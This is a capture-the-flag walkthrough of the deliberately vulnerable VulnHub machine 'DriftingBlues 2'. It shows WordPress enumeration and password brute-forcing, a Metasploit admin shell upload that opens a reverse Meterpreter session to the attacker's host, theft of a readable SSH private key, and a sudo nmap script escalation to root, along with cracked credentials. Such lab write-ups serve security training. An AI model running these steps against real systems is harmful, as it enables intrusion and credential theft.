# BOX NAME: DriftingBlues 2
**LINK**: https://www.vulnhub.com/entry/driftingblues-2,634/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate the box to find it's a wordpress site.
2. Enumerate the wordpress and bruteforce the user password.
3. Realize the user is a wordpress administratior. Use metasploits wp_admin_shell_upload
4. Enumerate the box locally. Realize the user freddie's .ssh folder is readable. Steal the id_rsa
5. Pivot to freddie and see he can use nmap as superuser.
6. Use NMAP to get root.

This box was fairly easy.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.49
[+] URL:	http://driftingblues.box
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-db2.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 19:11 CEST
Nmap scan report for test.driftingblues.box (10.77.0.49)
Host is up (0.0062s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION                                                                                                                                                                                                                
21/tcp open  ftp     ProFTPD                                                                                                                                                                                                                
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                                                      
|_-rwxr-xr-x   1 ftp      ftp       1403770 Dec 17  2020 secret.jpg                                                                                                                                                                         
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                                                                                         
| ssh-hostkey:                                                                                                                                                                                                                              
|   2048 6afed61723cb90792bb12d3753974658 (RSA)                                                                                                                                                                                             
|   256 5bc468d18959d748b096f311871c08ac (ECDSA)                                                                                                                                                                                            
|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)                                                                                                                                                                                          
80/tcp open  http    Apache httpd 2.4.38 ((Debian))                                                                                                                                                                                         
|_http-title: Site doesn't have a title (text/html).                                                                                                                                                                                        
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
http://driftingblues.box [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.77.0.49]
```

nikto-scan

```
─$ nikto -h $IP | tee nikto-db2.log   
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.49
+ Target Hostname:    10.77.0.49
+ Target Port:        80
+ Start Time:         2023-04-26 19:11:25 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 80, size: 5b6a925e8c2dc, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /blog/wp-login.php: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies                                                                                                                         
+ /blog/wp-login.php: Wordpress login found.                                                                                                                                                                                                                                                                              
+ 8102 requests: 0 error(s) and 8 item(s) reported on remote host                                                                                                                                                                                                                                                         
+ End Time:           2023-04-26 19:12:05 (GMT2) (40 seconds)                                                                                                                                                                                                                                                             
---------------------------------------------------------------------------                                                                                                                                                                                                                                               
+ 1 host(s) tested
```

fuzzing

```
/blog
/wp-admin
/wp-login

```
wpscan

```
└─$ wpscan  --url $URL/blog -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://driftingblues.box/blog/ [10.77.0.49]
[+] Started: Wed Apr 26 19:17:16 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://driftingblues.box/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://driftingblues.box/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://driftingblues.box/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://driftingblues.box/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.2 identified (Latest, released on 2023-03-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://driftingblues.box/blog/index.php/feed/, <generator>https://wordpress.org/?v=6.2</generator>
 |  - http://driftingblues.box/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://driftingblues.box/blog/wp-content/themes/twentytwentyone/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://driftingblues.box/blog/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://driftingblues.box/blog/wp-content/themes/twentytwentyone/style.css?ver=1.0
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://driftingblues.box/blog/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] albert
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://driftingblues.box/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Apr 26 19:17:17 2023
[+] Requests Done: 13
[+] Cached Requests: 49
[+] Data Sent: 3.572 KB
[+] Data Received: 10.376 KB
[+] Memory used: 178.57 MB
[+] Elapsed time: 00:00:01

```
```
└─$ wpscan  --url $URL/blog -U usernames.txt -P /base/wordlists/password/rockyou.txt
[SUCCESS - alberg / scotland1]
```


</details>
<details><summary><ins>OTHER</ins></summary>

Wordpress Exploit
```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting                Required  Description
   ----       ---------------                --------  -----------
   PASSWORD   scotland1                      yes       The WordPress password to authenticate with
   Proxies                                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     http://driftingblues.box/blog  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                             yes       The target port (TCP)
   SSL        false                          no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                              yes       The base path to the wordpress application
   USERNAME   albert                         yes       The WordPress username to authenticate with
   VHOST                                     no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.77.0.35       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.77.0.35:4444 
[*] Authenticating with WordPress using albert:scotland1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /blog/wp-content/plugins/lMDLsRNfCv/GPVSlTALzI.php...
[*] Sending stage (39927 bytes) to 10.77.0.49
[+] Deleted GPVSlTALzI.php
[+] Deleted lMDLsRNfCv.php
[+] Deleted ../lMDLsRNfCv
[*] Meterpreter session 1 opened (10.77.0.35:4444 -> 10.77.0.49:52562) at 2023-04-26 19:21:16 +0200

meterpreter >    
```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/wp-config.php
```

**SUID's**:

```
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chs
```
**SGID's**:

```
/usr/bin/crontab
/usr/bin/chage
/usr/bin/wall
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/ssh-agent                                                                                     
/usr/bin/dotlockfile                                                                                   
/usr/sbin/unix_chkp
```
**OTHERS**:

```
/home/freddie/.ssh/id_rsa

└─$ ssh -i id_rsa freddie@$IP
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
freddie@driftingblues:~$ 
```
```
freddie@driftingblues:~$ sudo -l
Matching Defaults entries for freddie on driftingblues:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User freddie may run the following commands on driftingblues:
    (root) NOPASSWD: /usr/bin/nmap

#GTFO-BIN
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF 
```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
albert:scotland1	/wordpress
wp_user:password	/mySQL
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
freddie@driftingblues:~$ echo 'os.execute("/bin/bash")' > rootbomb.sh
freddie@driftingblues:~$ chmod +x rootbomb.sh 
freddie@driftingblues:~$ sudo /usr/bin/nmap --script=rootbomb.sh
Starting Nmap 7.70 ( https://nmap.org ) at 2023-04-26 12:34 CDT
NSE: Warning: Loading 'rootbomb.sh' -- the recommended file extension is '.nse'.
root@driftingblues:/home/freddie# whoami
root@driftingblues:/home/freddie# root
root@driftingblues:/home/freddie#
```

```
user.txt
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

```
```
root.txt
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█                                                                                                                                                                                                                   
░░█░░▌░█░░█░░█░░░█░░█░░█                                                                                                                                                                                                                   
░░█░░▀▀░░██░░█░░░█░░█░░█                                                                                                                                                                                                                   
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█                                                                                                                                                                                                                   
                                                                                                                                                                                                                                           
congratulations!
```
</details>